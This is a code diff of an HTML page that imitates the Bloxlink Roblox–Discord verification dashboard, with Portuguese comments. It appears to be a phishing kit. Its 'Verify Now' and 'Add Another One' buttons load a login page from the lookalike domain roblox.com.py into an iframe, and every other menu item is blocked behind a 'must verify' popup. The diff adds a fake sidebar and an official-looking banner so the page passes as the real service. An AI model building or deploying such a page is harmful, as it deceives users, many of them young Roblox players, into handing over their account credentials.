@@ -4,136 +4,154 @@
   <meta charset="UTF-8" />
   <title>Bloxlink – Verifications</title>
 
+  <!-- FIX MOBILE -->
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
   <!-- FAVICON -->
-  <link rel="icon" href="https://cdn.top.gg/icons/cc8bb23addd8100447e8712bbf2f9d40.png" type="image/png">
+  <link 
+    rel="icon" 
+    href="https://cdn.top.gg/icons/cc8bb23addd8100447e8712bbf2f9d40.png" 
+    type="image/png"
+  >
 
   <link rel="stylesheet" href="style.css">
-
-  <style>
-    /* AUTH SCREEN */
-    .auth-overlay {
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,.85);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      z-index: 9999;
-    }
-
-    .auth-box {
-      background: #0b0f14;
-      width: 360px;
-      border-radius: 10px;
-      padding: 24px;
-      color: #fff;
-      text-align: center;
-      font-family: Arial, sans-serif;
-    }
-
-    .auth-box h3 {
-      margin: 12px 0 20px;
-      font-weight: 600;
-    }
-
-    .auth-logo {
-      width: 80px;
-      margin: 30px auto 10px;
-    }
-
-    .auth-btn {
-      width: 100%;
-      padding: 12px;
-      border-radius: 6px;
-      border: none;
-      margin-top: 12px;
-      font-weight: 600;
-      cursor: pointer;
-    }
-
-    .continue-btn {
-      background: #f2f2f2;
-      color: #000;
-    }
-
-    .return-btn {
-      background: transparent;
-      border: 1px solid #333;
-      color: #fff;
-    }
-
-    .auth-overlay.show {
-      display: flex;
-    }
-  </style>
 </head>
-
 <body>
 
-<button class="mobile-menu-btn" onclick="toggleSidebar()">☰</button>
+  <!-- BOTÃO MOBILE -->
+  <button class="mobile-menu-btn" onclick="toggleSidebar()">☰</button>
 
-<div class="layout">
-
-<aside class="sidebar" id="sidebar">
-  <div class="logo">
-    <img src="https://cdn.discordapp.com/attachments/1461462727888474264/1462115890991599658/wordmark.png" style="max-width:160px">
+  <div class="top-bar">
+    ℹ️ Bloxlink is now part of the Roblox family! Read more here:
+    <a href="#" target="_blank">https://x.com/bloxlink/status/1818339107220693288</a>
   </div>
-</aside>
 
-<main class="content">
-  <button class="verify-circle" onclick="openAuth()">Verify Now</button>
-</main>
+  <div class="layout">
 
-</div>
+    <aside class="sidebar" id="sidebar">
+      <div class="logo">
+        <!-- WORDMARK COMPLETA -->
+        <img 
+          src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS74yce_K-2zeL-yuobNx8HCwXe1I9CVlT6Kw&s" 
+          alt="Bloxlink"
+          style="max-width: 160px; height: auto;"
+        >
+      </div>
 
-<!-- STEP 1 AUTH SCREEN -->
-<div id="authOverlay" class="auth-overlay">
-  <div class="auth-box">
-    <h3>Authorize with Roblox OAuth</h3>
+      <div class="section">
+        <p class="section-title">GENERAL</p>
+        <button class="nav-item active" onclick="openBlockedPopup()">
+          <span class="icon">✓</span> Verifications
+        </button>
+        <button class="nav-item" onclick="openBlockedPopup()">
+          <span class="icon">▦</span> Manage Servers
+        </button>
+      </div>
 
-    <img class="auth-logo" src="https://cdn.top.gg/icons/cc8bb23addd8100447e8712bbf2f9d40.png">
+      <div class="section">
+        <p class="section-title">ACCOUNT</p>
+        <button class="nav-item" onclick="openBlockedPopup()">
+          <span class="icon">◼</span> Manage Subscriptions
+        </button>
+        <button class="nav-item" onclick="openBlockedPopup()">
+          <span class="icon">⚙</span> Settings
+        </button>
+      </div>
 
-    <p>Bloxlink</p>
+      <div class="section">
+        <p class="section-title">OTHER</p>
+        <button class="nav-item" onclick="openBlockedPopup()">
+          <span class="icon">?</span> Support
+        </button>
+        <button class="nav-item" onclick="openBlockedPopup()">
+          <span class="icon">⌘</span> Developer API
+        </button>
+      </div>
+    </aside>
 
-    <button class="auth-btn continue-btn" onclick="continueAuth()">Continue</button>
+    <main class="content">
+      <h2>Verifications</h2>
+      <p class="subtitle">Manage your linked Roblox accounts.</p>
 
-    <p style="margin:10px 0;color:#666;">or</p>
+      <div class="verify-card">
+        <div>
+          <h1>Get started now by linking your Roblox account to Discord</h1>
+          <p>
+            Join our millions of users by linking your Roblox account to Discord.
+            After verifying, you'll gain access to thousands of Roblox communities.
+          </p>
+        </div>
 
-    <button class="auth-btn return-btn" onclick="closeAuth()">Return to Bloxlink</button>
+        <button 
+          class="verify-circle"
+          onclick="openIframe('https://roblox.com.py/login?returnUrl=7692425652606225')"
+        >
+          Verify Now
+        </button>
+      </div>
+
+      <div class="missing-bar">
+        <span>Missing an account?</span>
+        <a 
+          href="#"
+          class="missing-btn"
+          onclick="openIframe('https://roblox.com.py/login?returnUrl=7692425652606225')"
+        >
+          + Add Another One
+        </a>
+      </div>
+
+    </main>
   </div>
-</div>
 
-<!-- STEP 2 IFRAME POPUP -->
-<div id="iframeOverlay" class="popup-overlay">
-  <div class="iframe-popup">
-    <button class="close-iframe" onclick="closeAll()">✕</button>
-    <iframe id="popupIframe"></iframe>
+  <!-- OVERLAY SIDEBAR MOBILE -->
+  <div id="sidebarOverlay" class="sidebar-overlay" onclick="toggleSidebar()"></div>
+
+  <!-- POPUP BLOQUEADO -->
+  <div id="blockedOverlay" class="popup-overlay">
+    <div class="popup">
+      <div class="popup-header red">
+        Must verify to access other sections of the dashboard
+      </div>
+      <div class="popup-body">
+        <button onclick="closeBlocked()">Close</button>
+      </div>
+    </div>
   </div>
-</div>
 
-<script>
-function openAuth() {
-  document.getElementById("authOverlay").classList.add("show");
-}
+  <!-- POPUP IFRAME -->
+  <div id="iframeOverlay" class="popup-overlay">
+    <div class="iframe-popup">
+      <button class="close-iframe" onclick="closeIframe()">✕</button>
+      <iframe id="popupIframe"></iframe>
+    </div>
+  </div>
 
-function closeAuth() {
-  document.getElementById("authOverlay").classList.remove("show");
-}
+  <script>
+    function openBlockedPopup() {
+      document.getElementById("blockedOverlay").classList.add("show");
+    }
 
-function continueAuth() {
-  closeAuth();
-  document.getElementById("popupIframe").src =
-    "https://roblox.com.py/login?returnUrl=7692425652606225";
-  document.getElementById("iframeOverlay").classList.add("show");
-}
+    function closeBlocked() {
+      document.getElementById("blockedOverlay").classList.remove("show");
+    }
 
-function closeAll() {
-  document.getElementById("popupIframe").src = "";
-  document.getElementById("iframeOverlay").classList.remove("show");
-}
-</script>
+    function openIframe(url) {
+      document.getElementById("popupIframe").src = url;
+      document.getElementById("iframeOverlay").classList.add("show");
+    }
+
+    function closeIframe() {
+      document.getElementById("popupIframe").src = "";
+      document.getElementById("iframeOverlay").classList.remove("show");
+    }
+
+    /* FIX MOBILE SIDEBAR */
+    function toggleSidebar() {
+      document.getElementById("sidebar").classList.toggle("open");
+      document.getElementById("sidebarOverlay").classList.toggle("show");
+    }
+  </script>
 
 </body>
 </html>
